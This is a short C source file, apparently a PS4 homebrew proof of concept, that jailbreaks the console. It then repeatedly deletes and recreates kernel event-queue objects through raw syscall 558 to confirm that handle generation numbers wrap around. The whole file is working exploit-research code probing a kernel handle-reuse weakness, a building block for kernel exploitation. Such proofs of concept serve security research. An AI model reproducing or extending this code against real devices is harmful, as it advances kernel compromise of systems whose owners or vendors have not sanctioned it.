#define SYS_NAMEDOBJ_DELETE 558

#include "ps4.h"
#include "syscall.h"

int _main(struct thread *td)
{
    UNUSED(td);

    initKernel();
    initLibc();

    jailbreak();
    initSysUtil();

    SceKernelEqueue eq;
    SceKernelEqueue handles[8];

    printf_notification("Generation Wraparound ");

    sceKernelCreateEqueue(&eq, "poc");

    uint64_t h0 = eq;

    printf_debug("Initial: 0x%lx\n", h0);

    for(int i = 0; i < 8; i++)
    {
        syscall(
            SYS_NAMEDOBJ_DELETE,
            (uint32_t)(h0 >> 32),
            0x107
        );

        sceKernelCreateEqueue(
            &handles[i],
            "poc"
        );

        printf_debug(
            "Iteration %d: 0x%lx\n",
            i,
            handles[i]
        );
    }

    if ((handles[7] & 0xffff) == (h0 & 0xffff))
    {
        printf_notification("WRAP CONFIRMED");
    }

    return 0;
}